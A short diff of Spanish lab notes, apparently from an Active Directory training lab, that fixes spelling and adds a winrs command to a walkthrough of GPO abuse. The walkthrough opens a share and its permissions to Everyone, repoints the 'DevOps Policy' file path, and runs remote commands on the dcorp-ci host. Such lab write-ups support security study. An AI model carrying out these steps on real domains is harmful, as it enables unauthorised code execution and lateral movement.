@@ -95,17 +95,17 @@ Primero compartiremos el recurso
 net share std97-gp=C:\AD\Tools\std97-gp /grant:Everyone,Full
 ```
 
-Y ahora le darermos permisos a todos
+Y ahora le daremos permisos a todos
 ```shell
 icacls "C:\AD\Tools\std97-gp" /grant Everyone:F /T
 ```
 
-Ahora podemos ver si se ha modificado la politica de *DevOps* en la zona de *gPCfileSysPath*
+Ahora podemos ver si se ha modificado la política de *DevOps* en la zona de *gPCfileSysPath*
 ```shell
 Get-DomainGPO -Identity "DevOps Policy"
 ```
 
-La actualizacion de la politica nos tendria que permitir ejecutar comandos en el dominio *DCORP-CI*
+La actualización de la política nos tendría que permitir ejecutar comandos en el dominio *DCORP-CI*
 ```shell
-
+winrs -r:dcorp-ci cmd /c "set computername && set username"
 ```
